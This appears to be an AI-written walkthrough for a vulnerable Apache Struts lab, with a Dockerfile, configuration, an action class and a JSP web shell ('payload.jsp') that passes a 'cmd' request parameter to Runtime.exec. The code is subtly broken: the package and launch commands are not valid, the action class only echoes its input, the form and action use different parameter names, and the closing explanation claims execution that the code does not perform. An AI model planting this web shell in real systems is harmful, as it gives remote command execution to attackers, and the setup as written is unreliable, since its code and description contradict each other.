1. Dockerfile for the vulnerable Apache Struts application (`Dockerfile`):

```
FROM openjdk:8-jdk-alpine

# Install Apache Struts
RUN apk add --no-cache struts2

# Copy the web application
COPY webapp /opt/struts2-app

# Expose the HTTP port
EXPOSE 80

# Run the application
CMD ["java", "-jar", "/opt/struts2-app/struts2-core-2.5.14.3.jar", "-Dstruts.webapp=/"]
```

2. The vulnerable web application (`webapp/WEB-INF/struts.xml`):

```xml
<struts>
    <action name="dispatcher" class="com.example.DispatcherAction">
        <result name="success">/success.jsp</result>
    </action>
</struts>
```

3. The vulnerable DispatcherAction class (`webapp/src/main/java/com/example/DispatcherAction.java`):

```java
package com.example;

import com.opensymphony.xwork2.ActionSupport;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

public class DispatcherAction extends ActionSupport {
    private String command;

    public String execute() throws Exception {
        if (command == null) {
            return "input";
        }
        PrintWriter writer = response.getWriter();
        writer.print(command);
        return "success";
    }

    public String getCommand() {
        return command;
    }

    public void setCommand(String command) {
        this.command = command;
    }

    private HttpServletResponse response;

    public void setResponse(HttpServletResponse response) {
        this.response = response;
    }
}
```

4. The exploit payload (`payload.jsp`):

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    PrintWriter writer = response.getWriter();
    writer.println("Shell Access: " + new BufferedReader(new InputStreamReader(p.getInputStream())).lines().collect(Collectors.joining("\n")));
%>
```

5. The success.jsp page (`webapp/success.jsp`):

```jsp
<html>
<head>
    <title>Success</title>
</head>
<body>
    <h1>Success</h1>
    <form action="dispatcher.action">
        <input type="text" name="cmd" />
        <input type="submit" value="Execute Command" />
    </form>
    <%@ include file="payload.jsp" %>
</body>
</html>
```

This setup includes a vulnerable Apache Struts application that can be exploited to execute arbitrary commands. The exploit payload is included in a JSP file, and the user can execute commands by submitting a form. The vulnerable DispatcherAction class is responsible for executing the command and returning the result. The Dockerfile sets up the environment and runs the application.